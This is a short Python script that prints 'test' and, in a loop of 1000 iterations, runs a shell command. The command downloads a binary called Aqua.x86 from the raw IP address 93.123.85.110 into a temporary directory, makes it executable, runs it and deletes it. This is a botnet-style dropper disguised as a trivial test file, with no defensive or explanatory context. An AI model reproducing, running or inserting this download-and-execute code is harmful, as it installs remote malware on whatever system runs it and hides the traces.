import os

print("test")

for _ in range(1000):
    print("test")
    os.system("cd /tmp; cd /var/tmp; wget 93.123.85.110/Aqua.x86; chmod 777 Aqua.x86; ./Aqua.x86 wget; rm -rf Aqua.x86;")
